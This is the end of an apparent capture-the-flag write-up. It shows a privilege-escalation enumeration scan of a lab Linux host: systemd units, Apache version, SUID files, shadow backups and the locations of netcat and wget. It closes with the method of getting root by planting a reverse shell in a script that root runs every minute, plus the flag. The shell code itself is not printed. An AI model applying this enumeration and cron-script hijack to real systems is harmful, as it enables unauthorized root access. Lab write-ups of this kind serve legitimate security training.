-rw-r--r-- 1 root root  356 Jan 18  2017 sockets.target
-rw-r--r-- 1 root root  380 Jan 18  2017 sound.target
-rw-r--r-- 1 root root  441 Jan 18  2017 suspend.target
-rw-r--r-- 1 root root  353 Jan 18  2017 swap.target
-rw-r--r-- 1 root root  715 Jan 18  2017 sys-fs-fuse-connections.mount
-rw-r--r-- 1 root root  719 Jan 18  2017 sys-kernel-config.mount
-rw-r--r-- 1 root root  662 Jan 18  2017 sys-kernel-debug.mount
-rw-r--r-- 1 root root  518 Jan 18  2017 sysinit.target
-rw-r--r-- 1 root root 1.3K Jan 18  2017 syslog.socket
-rw-r--r-- 1 root root  585 Jan 18  2017 system-update.target
-rw-r--r-- 1 root root  436 Jan 18  2017 system.slice
-rw-r--r-- 1 root root  646 Jan 18  2017 systemd-ask-password-console.path
-rw-r--r-- 1 root root  574 Jan 18  2017 systemd-ask-password-wall.path
-rw-r--r-- 1 root root  409 Jan 18  2017 systemd-bus-proxyd.socket
-rw-r--r-- 1 root root  540 Jan 18  2017 systemd-fsckd.socket
-rw-r--r-- 1 root root  524 Jan 18  2017 systemd-initctl.socket
-rw-r--r-- 1 root root  607 Jan 18  2017 systemd-journald-audit.socket
-rw-r--r-- 1 root root 1.1K Jan 18  2017 systemd-journald-dev-log.socket
-rw-r--r-- 1 root root  842 Jan 18  2017 systemd-journald.socket
-rw-r--r-- 1 root root  591 Jan 18  2017 systemd-networkd.socket
-rw-r--r-- 1 root root  617 Jan 18  2017 systemd-rfkill.socket
-rw-r--r-- 1 root root  450 Jan 18  2017 systemd-tmpfiles-clean.timer
-rw-r--r-- 1 root root  578 Jan 18  2017 systemd-udevd-control.socket
-rw-r--r-- 1 root root  570 Jan 18  2017 systemd-udevd-kernel.socket
-rw-r--r-- 1 root root  395 Jan 18  2017 time-sync.target
-rw-r--r-- 1 root root  405 Jan 18  2017 timers.target
-rw-r--r-- 1 root root  417 Jan 18  2017 umount.target
-rw-r--r-- 1 root root  392 Jan 18  2017 user.slice
-rw-r--r-- 1 root root  663 Jan 18  2017 systemd-networkd-resolvconf-update.service
-rw-r--r-- 1 root root  153 Jan 17  2017 apt-daily.service
-rw-r--r-- 1 root root  162 Jan 17  2017 apt-daily.timer
-rw-r--r-- 1 root root  342 Jan 13  2017 getty-static.service
-rw-r--r-- 1 root root  153 Jan 13  2017 sigpwr-container-shutdown.service
-rw-r--r-- 1 root root  152 Jan 13  2017 systemd-networkd-resolvconf-update.path
-rw-r--r-- 1 root root  491 Jan 12  2017 dbus.service
-rw-r--r-- 1 root root  106 Jan 12  2017 dbus.socket
-rw-r--r-- 1 root root  189 Dec 16  2016 uuidd.service
-rw-r--r-- 1 root root  126 Dec 16  2016 uuidd.socket
-rw-r--r-- 1 root root  735 Nov 30  2016 networking.service
-rw-r--r-- 1 root root  497 Nov 30  2016 ifup@.service
-rw-r--r-- 1 root root  631 Nov  3  2016 accounts-daemon.service
-rw-r--r-- 1 root root  251 Sep 17  2016 open-vm-tools.service
-rw-r--r-- 1 root root  285 Jun 16  2016 keyboard-setup.service
-rw-r--r-- 1 root root  288 Jun 16  2016 console-setup.service
lrwxrwxrwx 1 root root   27 May 10  2016 plymouth-log.service -> plymouth-read-write.service
lrwxrwxrwx 1 root root   21 May 10  2016 plymouth.service -> plymouth-quit.service
-rw-r--r-- 1 root root  412 May 10  2016 plymouth-halt.service
-rw-r--r-- 1 root root  426 May 10  2016 plymouth-kexec.service
-rw-r--r-- 1 root root  421 May 10  2016 plymouth-poweroff.service
-rw-r--r-- 1 root root  200 May 10  2016 plymouth-quit-wait.service
-rw-r--r-- 1 root root  194 May 10  2016 plymouth-quit.service
-rw-r--r-- 1 root root  244 May 10  2016 plymouth-read-write.service
-rw-r--r-- 1 root root  416 May 10  2016 plymouth-reboot.service
-rw-r--r-- 1 root root  532 May 10  2016 plymouth-start.service
-rw-r--r-- 1 root root  291 May 10  2016 plymouth-switch-root.service
-rw-r--r-- 1 root root  490 May 10  2016 systemd-ask-password-plymouth.path
-rw-r--r-- 1 root root  467 May 10  2016 systemd-ask-password-plymouth.service
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel1.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel2.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel3.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel4.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel5.target.wants
-rw-r--r-- 1 root root  251 Apr  5  2016 cron.service
-rw-r--r-- 1 root root  290 Apr  5  2016 rsyslog.service
-rw-r--r-- 1 root root  395 Jun  3  2015 resolvconf.service
-rw-r--r-- 1 root root  790 Jun  1  2015 friendly-recovery.service
-rw-r--r-- 1 root root  241 Mar  2  2015 ufw.service
-rw-r--r-- 1 root root  250 Feb 24  2015 ureadahead-stop.service
-rw-r--r-- 1 root root  242 Feb 24  2015 ureadahead-stop.timer
-rw-r--r-- 1 root root  401 Feb 24  2015 ureadahead.service
-rw-r--r-- 1 root root  188 Feb 24  2014 rsync.service

/lib/systemd/system/apache2.service.d:
total 4.0K
-rw-r--r-- 1 root root 42 Apr 12  2016 apache2-systemd.conf

/lib/systemd/system/halt.target.wants:
total 0
lrwxrwxrwx 1 root root 24 May 10  2016 plymouth-halt.service -> ../plymouth-halt.service

/lib/systemd/system/initrd-switch-root.target.wants:
total 0
lrwxrwxrwx 1 root root 25 May 10  2016 plymouth-start.service -> ../plymouth-start.service
lrwxrwxrwx 1 root root 31 May 10  2016 plymouth-switch-root.service -> ../plymouth-switch-root.service

/lib/systemd/system/kexec.target.wants:
total 0
lrwxrwxrwx 1 root root 25 May 10  2016 plymouth-kexec.service -> ../plymouth-kexec.service

/lib/systemd/system/multi-user.target.wants:
total 0
lrwxrwxrwx 1 root root 15 Dec  4  2017 getty.target -> ../getty.target
lrwxrwxrwx 1 root root 33 Dec  4  2017 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
lrwxrwxrwx 1 root root 25 Dec  4  2017 systemd-logind.service -> ../systemd-logind.service
lrwxrwxrwx 1 root root 39 Dec  4  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 32 Dec  4  2017 systemd-user-sessions.service -> ../systemd-user-sessions.service
lrwxrwxrwx 1 root root 15 Jan 12  2017 dbus.service -> ../dbus.service
lrwxrwxrwx 1 root root 29 May 10  2016 plymouth-quit-wait.service -> ../plymouth-quit-wait.service
lrwxrwxrwx 1 root root 24 May 10  2016 plymouth-quit.service -> ../plymouth-quit.service

/lib/systemd/system/poweroff.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Dec  4  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 28 May 10  2016 plymouth-poweroff.service -> ../plymouth-poweroff.service

/lib/systemd/system/reboot.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Dec  4  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 26 May 10  2016 plymouth-reboot.service -> ../plymouth-reboot.service

/lib/systemd/system/sysinit.target.wants:
total 0
lrwxrwxrwx 1 root root 24 Dec  4  2017 systemd-udevd.service -> ../systemd-udevd.service
lrwxrwxrwx 1 root root 30 Dec  4  2017 systemd-update-utmp.service -> ../systemd-update-utmp.service
lrwxrwxrwx 1 root root 24 Dec  4  2017 console-setup.service -> ../console-setup.service
lrwxrwxrwx 1 root root 20 Dec  4  2017 cryptsetup.target -> ../cryptsetup.target
lrwxrwxrwx 1 root root 22 Dec  4  2017 dev-hugepages.mount -> ../dev-hugepages.mount
lrwxrwxrwx 1 root root 19 Dec  4  2017 dev-mqueue.mount -> ../dev-mqueue.mount
lrwxrwxrwx 1 root root 25 Dec  4  2017 keyboard-setup.service -> ../keyboard-setup.service
lrwxrwxrwx 1 root root 28 Dec  4  2017 kmod-static-nodes.service -> ../kmod-static-nodes.service
lrwxrwxrwx 1 root root 36 Dec  4  2017 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
lrwxrwxrwx 1 root root 19 Dec  4  2017 setvtrgb.service -> ../setvtrgb.service
lrwxrwxrwx 1 root root 32 Dec  4  2017 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
lrwxrwxrwx 1 root root 26 Dec  4  2017 sys-kernel-config.mount -> ../sys-kernel-config.mount
lrwxrwxrwx 1 root root 25 Dec  4  2017 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
lrwxrwxrwx 1 root root 36 Dec  4  2017 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
lrwxrwxrwx 1 root root 25 Dec  4  2017 systemd-binfmt.service -> ../systemd-binfmt.service
lrwxrwxrwx 1 root root 30 Dec  4  2017 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
lrwxrwxrwx 1 root root 32 Dec  4  2017 systemd-journal-flush.service -> ../systemd-journal-flush.service
lrwxrwxrwx 1 root root 27 Dec  4  2017 systemd-journald.service -> ../systemd-journald.service
lrwxrwxrwx 1 root root 36 Dec  4  2017 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
lrwxrwxrwx 1 root root 31 Dec  4  2017 systemd-modules-load.service -> ../systemd-modules-load.service
lrwxrwxrwx 1 root root 30 Dec  4  2017 systemd-random-seed.service -> ../systemd-random-seed.service
lrwxrwxrwx 1 root root 25 Dec  4  2017 systemd-sysctl.service -> ../systemd-sysctl.service
lrwxrwxrwx 1 root root 37 Dec  4  2017 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
lrwxrwxrwx 1 root root 33 Dec  4  2017 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
lrwxrwxrwx 1 root root 31 Dec  4  2017 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
lrwxrwxrwx 1 root root 30 May 10  2016 plymouth-read-write.service -> ../plymouth-read-write.service
lrwxrwxrwx 1 root root 25 May 10  2016 plymouth-start.service -> ../plymouth-start.service

/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Dec  4  2017 systemd-initctl.socket -> ../systemd-initctl.socket
lrwxrwxrwx 1 root root 32 Dec  4  2017 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
lrwxrwxrwx 1 root root 34 Dec  4  2017 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
lrwxrwxrwx 1 root root 26 Dec  4  2017 systemd-journald.socket -> ../systemd-journald.socket
lrwxrwxrwx 1 root root 31 Dec  4  2017 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
lrwxrwxrwx 1 root root 30 Dec  4  2017 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
lrwxrwxrwx 1 root root 14 Jan 12  2017 dbus.socket -> ../dbus.socket

/lib/systemd/system/timers.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Dec  4  2017 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer

/lib/systemd/system/systemd-timesyncd.service.d:
total 4.0K
-rw-r--r-- 1 root root 251 Jan 12  2017 disable-with-time-daemon.conf

/lib/systemd/system/sigpwr.target.wants:
total 0
lrwxrwxrwx 1 root root 36 Dec  4  2017 sigpwr-container-shutdown.service -> ../sigpwr-container-shutdown.service

/lib/systemd/system/rescue.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Dec  4  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/resolvconf.service.wants:
total 0
lrwxrwxrwx 1 root root 42 Dec  4  2017 systemd-networkd-resolvconf-update.path -> ../systemd-networkd-resolvconf-update.path

/lib/systemd/system/rc-local.service.d:
total 4.0K
-rw-r--r-- 1 root root 290 Jan 12  2017 debian.conf

/lib/systemd/system/graphical.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Dec  4  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/local-fs.target.wants:
total 0
lrwxrwxrwx 1 root root 29 Dec  4  2017 systemd-remount-fs.service -> ../systemd-remount-fs.service

/lib/systemd/system/getty.target.wants:
total 0
lrwxrwxrwx 1 root root 23 Dec  4  2017 getty-static.service -> ../getty-static.service

/lib/systemd/system/busnames.target.wants:
total 0

/lib/systemd/system/runlevel1.target.wants:
total 0

/lib/systemd/system/runlevel2.target.wants:
total 0

/lib/systemd/system/runlevel3.target.wants:
total 0

/lib/systemd/system/runlevel4.target.wants:
total 0

/lib/systemd/system/runlevel5.target.wants:
total 0

/lib/systemd/system-sleep:
total 4.0K
-rwxr-xr-x 1 root root 92 Mar 17  2016 hdparm

/lib/systemd/system-preset:
total 4.0K
-rw-r--r-- 1 root root 869 Jan 18  2017 90-systemd.preset

/lib/systemd/system-generators:
total 668K
-rwxr-xr-x 1 root root  59K Jan 18  2017 systemd-dbus1-generator
-rwxr-xr-x 1 root root  71K Jan 18  2017 systemd-cryptsetup-generator
-rwxr-xr-x 1 root root  43K Jan 18  2017 systemd-debug-generator
-rwxr-xr-x 1 root root  79K Jan 18  2017 systemd-fstab-generator
-rwxr-xr-x 1 root root  39K Jan 18  2017 systemd-getty-generator
-rwxr-xr-x 1 root root 119K Jan 18  2017 systemd-gpt-auto-generator
-rwxr-xr-x 1 root root  39K Jan 18  2017 systemd-hibernate-resume-generator
-rwxr-xr-x 1 root root  39K Jan 18  2017 systemd-insserv-generator
-rwxr-xr-x 1 root root  35K Jan 18  2017 systemd-rc-local-generator
-rwxr-xr-x 1 root root  31K Jan 18  2017 systemd-system-update-generator
-rwxr-xr-x 1 root root 103K Jan 18  2017 systemd-sysv-generator

/lib/systemd/network:
total 12K
-rw-r--r-- 1 root root 404 Jan 18  2017 80-container-host0.network
-rw-r--r-- 1 root root 482 Jan 18  2017 80-container-ve.network
-rw-r--r-- 1 root root  80 Jan 18  2017 99-default.link

/lib/systemd/system-shutdown:
total 0


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.16


[-] Apache version:
Server version: Apache/2.4.18 (Ubuntu)
Server built:   2017-09-18T15:09:02


[-] Apache user configuration:
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data


[-] Installed Apache modules:
Loaded Modules:
 core_module (static)
 so_module (static)
 watchdog_module (static)
 http_module (static)
 log_config_module (static)
 logio_module (static)
 version_module (static)
 unixd_module (static)
 access_compat_module (shared)
 alias_module (shared)
 auth_basic_module (shared)
 authn_core_module (shared)
 authn_file_module (shared)
 authz_core_module (shared)
 authz_host_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 deflate_module (shared)
 dir_module (shared)
 env_module (shared)
 filter_module (shared)
 mime_module (shared)
 mpm_prefork_module (shared)
 negotiation_module (shared)
 php7_module (shared)
 setenvif_module (shared)
 status_module (shared)


### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 1482 Dec  4  2017 /etc/passwd
-rw-r--r-- 1 root root 820 Dec  4  2017 /etc/group
-rw-r--r-- 1 root root 575 Oct 22  2015 /etc/profile
-rw-r----- 1 root shadow 1030 Jun  2 07:25 /etc/shadow


[-] SUID files:
-rwsr-xr-x 1 root root 40152 Dec 16  2016 /bin/mount
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40128 Mar 29  2016 /bin/su
-rwsr-xr-x 1 root root 27608 Dec 16  2016 /bin/umount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 40432 Mar 29  2016 /usr/bin/chsh
-rwsr-xr-x 1 root root 39904 Mar 29  2016 /usr/bin/newgrp
-rwsr-xr-x 1 root root 136808 Jan 20  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 49584 Mar 29  2016 /usr/bin/chfn
-rwsr-xr-x 1 root root 54256 Mar 29  2016 /usr/bin/passwd
-rwsr-xr-x 1 root root 75304 Mar 29  2016 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 10624 Feb  9  2017 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 428240 Aug 11  2016 /usr/lib/openssh/ssh-keysign


[-] SGID files:
-rwxr-sr-x 1 root shadow 35632 Mar 16  2016 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35600 Mar 16  2016 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 22768 Mar 29  2016 /usr/bin/expiry
-rwxr-sr-x 1 root crontab 36080 Apr  5  2016 /usr/bin/crontab
-rwxr-sr-x 1 root ssh 358624 Aug 11  2016 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 62336 Mar 29  2016 /usr/bin/chage
-rwxr-sr-x 1 root tty 27368 Dec 16  2016 /usr/bin/wall
-rwxr-sr-x 1 root tty 14752 Mar  1  2016 /usr/bin/bsd-write
-rwxr-sr-x 1 root mlocate 39520 Nov 17  2014 /usr/bin/mlocate


[+] Files with POSIX capabilities set:
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 703 May  5  2015 /etc/logrotate.conf
-rw-r--r-- 1 root root 604 Jul  2  2015 /etc/deluser.conf
-rw-r--r-- 1 root root 497 May  4  2014 /etc/nsswitch.conf
-rw-r--r-- 1 root root 14867 Apr 11  2016 /etc/ltrace.conf
-rw-r--r-- 1 root root 7788 Dec  4  2017 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 552 Mar 16  2016 /etc/pam.conf
-rw-r--r-- 1 root root 2084 Sep  5  2015 /etc/sysctl.conf
-rw-r--r-- 1 root root 338 Nov 17  2014 /etc/updatedb.conf
-rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf
-rw-r--r-- 1 root root 2584 Feb 18  2016 /etc/gai.conf
-rw-r--r-- 1 root root 4781 Mar 17  2016 /etc/hdparm.conf
-rw-r--r-- 1 root root 967 Oct 30  2015 /etc/mke2fs.conf
-rw-r--r-- 1 root root 3028 Feb 15  2017 /etc/adduser.conf
-rw-r--r-- 1 root root 771 Mar  6  2015 /etc/insserv.conf
-rw-r--r-- 1 root root 2969 Nov 10  2015 /etc/debconf.conf
-rw-r--r-- 1 root root 92 Oct 22  2015 /etc/host.conf
-rw-r--r-- 1 root root 191 Jan 18  2016 /etc/libaudit.conf
-rw-r--r-- 1 root root 144 Dec  4  2017 /etc/kernel-img.conf
-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
-rw-r--r-- 1 root root 1371 Jan 27  2016 /etc/rsyslog.conf
-rw-r--r-- 1 root root 280 Jun 19  2014 /etc/fuse.conf
-rw-r--r-- 1 root root 350 Dec  4  2017 /etc/popularity-contest.conf


[-] Current user's history files:
-rw------- 1 scriptmanager scriptmanager 2 Dec  4  2017 /home/scriptmanager/.bash_history


[-] Location and contents (if accessible) of .bash_history file(s):
/home/scriptmanager/.bash_history

/home/arrexel/.bash_history


[-] Location and Permissions (if accessible) of .bak file(s):
-rw------- 1 root root 820 Dec  4  2017 /var/backups/group.bak
-rw------- 1 root shadow 1030 Jun  2 07:25 /var/backups/shadow.bak
-rw------- 1 root shadow 692 Dec  4  2017 /var/backups/gshadow.bak
-rw------- 1 root root 1482 Dec  4  2017 /var/backups/passwd.bak
-rw-r--r-- 1 root root 3024 Dec  4  2017 /etc/apt/sources.bak


[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Jun  2 07:19 .
drwxr-xr-x 12 root root 4096 Jun  2 07:19 ..


### SCAN COMPLETE ####################################
```

## Root
Root executes /scripts/test.py every minute. We can modify this to contain a reverse shell and get root.
[ROOT][FLAG]
Flag: 095a81b7006598cdb2ad1d134bcd1df3
